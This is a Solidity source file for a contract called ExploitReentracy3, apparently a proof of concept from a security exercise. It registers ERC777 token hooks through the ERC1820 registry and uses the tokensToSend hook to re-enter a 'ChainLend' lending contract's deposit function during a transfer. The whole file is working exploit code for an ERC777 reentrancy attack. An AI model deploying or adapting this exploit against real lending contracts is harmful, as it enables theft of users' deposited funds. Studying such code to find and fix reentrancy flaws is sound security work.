// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

// 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24

interface IChainLend {
    function deposit(uint256 amount) external;
}

contract ExploitReentracy3 is IERC777Recipient, IERC777Sender {
    IChainLend immutable chainLend;
    IERC1820Registry immutable erc1820Registry;

    constructor(address _chainLend) {
        chainLend = IChainLend(_chainLend);
        erc1820Registry = IERC1820Registry(
            0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
        );
        erc1820Registry.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensSender"),
            address(this)
        );
        erc1820Registry.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {}

    // This function is triggered on transferFrom.
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        chainLend.deposit(100000000 / 10);
        return;
    }

    function attack() external payable {
        chainLend.deposit(0);
    }

    receive() external payable {}
}
